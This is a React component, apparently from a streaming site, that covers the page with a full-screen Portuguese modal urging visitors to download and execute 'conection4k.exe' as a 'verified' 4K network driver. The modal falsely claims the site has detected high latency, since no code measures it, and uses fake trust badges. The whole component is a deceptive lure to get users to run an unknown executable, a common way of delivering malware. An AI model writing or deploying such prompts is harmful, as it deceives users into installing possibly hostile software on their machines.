"use client";

import { useEffect, useState } from 'react';
import { Download, X, Zap, Activity, MonitorPlay, MousePointer2, ShieldCheck, Cpu } from 'lucide-react';

export function ExtensionPrompt() {
    const [isVisible, setIsVisible] = useState(false);
    const [isInstalled, setIsInstalled] = useState(false);

    useEffect(() => {
        const checkInstallation = () => {
            const installed = document.documentElement.dataset.sentinelActive === 'true' ||
                (window as any).__ANIFLIX_SENTINEL__ === true;
            setIsInstalled(installed);

            if (!installed) {
                const timer = setTimeout(() => setIsVisible(true), 1500);
                return () => clearTimeout(timer);
            }
        };

        checkInstallation();
    }, []);

    if (!isVisible || isInstalled) return null;

    return (
        <div className="fixed inset-0 z-[99999] bg-black/90 backdrop-blur-2xl flex items-center justify-center p-4 animate-in fade-in zoom-in-95 duration-700">
            <div className="bg-zinc-950 border-2 border-red-600/30 w-full max-w-4xl rounded-[4rem] shadow-[0_0_200px_rgba(220,38,38,0.2)] relative overflow-hidden flex flex-col lg:flex-row">

                {/* Visual Impact Side */}
                <div className="lg:w-1/2 p-12 bg-gradient-to-br from-red-950/40 via-transparent to-transparent flex flex-col justify-between">
                    <div className="space-y-8">
                        <div className="flex items-center gap-3 text-red-500">
                            <Activity size={24} className="animate-pulse" />
                            <span className="text-[10px] font-black uppercase tracking-[0.5em] text-red-500/80">Protocolo Ultra Core</span>
                        </div>

                        <div className="space-y-4">
                            <h2 className="text-5xl md:text-6xl font-black text-white italic leading-none tracking-tighter">
                                CONEXÃO <span className="text-red-700">4K</span>
                                <br />
                                UNLOCKED
                            </h2>
                            <p className="text-zinc-400 text-sm font-medium leading-relaxed max-w-md">
                                Detectamos que sua latência está limitando o potencial do nosso player. Ative o motor <span className="text-white font-bold">Conection4K</span> para estabilizar o buffer e liberar bitrate máximo sem quedas.
                            </p>
                        </div>
                    </div>

                    <div className="grid grid-cols-2 gap-4 mt-12">
                        <div className="bg-white/5 border border-white/10 p-5 rounded-[2.5rem] space-y-2">
                            <Zap size={20} className="text-amber-500 fill-amber-500/20" />
                            <p className="text-[10px] text-zinc-300 font-bold uppercase tracking-widest leading-none">Buffers<br /><span className="text-amber-500">Sincronizados</span></p>
                        </div>
                        <div className="bg-white/5 border border-white/10 p-5 rounded-[2.5rem] space-y-2">
                            <Cpu size={20} className="text-blue-500 fill-blue-500/20" />
                            <p className="text-[10px] text-zinc-300 font-bold uppercase tracking-widest leading-none">IA Driver<br /><span className="text-blue-500">Ativado</span></p>
                        </div>
                    </div>
                </div>

                {/* Action Side */}
                <div className="lg:w-1/2 bg-zinc-900/40 p-12 flex flex-col justify-center relative border-l border-white/5">
                    <button
                        onClick={() => setIsVisible(false)}
                        className="absolute top-8 right-8 text-zinc-600 hover:text-white transition-colors"
                    >
                        <X size={28} />
                    </button>

                    <div className="space-y-10">
                        <div className="space-y-6">
                            <h4 className="text-zinc-500 font-black text-[10px] uppercase tracking-[0.4em]">Passo Único de Ativação</h4>

                            <div className="flex gap-6 items-start bg-white/5 p-6 rounded-[2.5rem] border border-white/10 group hover:border-red-600/30 transition-all">
                                <div className="w-12 h-12 bg-red-600 rounded-2xl flex items-center justify-center text-white font-black shrink-0 shadow-[0_0_20px_rgba(220,38,38,0.4)]">1</div>
                                <div>
                                    <p className="text-white font-black uppercase italic text-lg leading-tight mb-1">Baixe e Execute</p>
                                    <p className="text-zinc-500 text-[11px] font-bold leading-snug">
                                        Clique no botão abaixo para baixar o <span className="text-red-500">conection4k.exe</span>. Basta clicar e executar para otimizar seu navegador automaticamente.
                                    </p>
                                </div>
                            </div>
                        </div>

                        <div className="space-y-6">
                            <a
                                href="/conection4k.exe"
                                className="group w-full bg-red-600 hover:bg-white text-white hover:text-red-600 py-8 rounded-full font-black text-sm uppercase tracking-[0.3em] flex items-center justify-center gap-4 transition-all duration-500 shadow-[0_25px_50px_rgba(220,38,38,0.25)] hover:shadow-none translate-y-0 hover:-translate-y-1"
                            >
                                <Download size={24} className="group-hover:bounce" />
                                Ativar Conexão 4K
                            </a>

                            <div className="flex items-center justify-center gap-6">
                                <span className="text-[9px] text-zinc-600 font-black uppercase tracking-widest flex items-center gap-2">
                                    <ShieldCheck size={14} className="text-emerald-500" /> Verificado
                                </span>
                                <span className="text-[9px] text-zinc-600 font-black uppercase tracking-widest flex items-center gap-2">
                                    <MonitorPlay size={14} className="text-blue-500" /> Multi-Browser
                                </span>
                            </div>
                        </div>

                        <div className="p-6 bg-red-600/5 border border-red-600/10 rounded-[2rem]">
                            <p className="text-[10px] text-zinc-500 font-bold uppercase leading-relaxed text-center italic">
                                "O driver otimiza a pilha de rede do Windows especificamente para transmissões de vídeo em alta definição."
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}
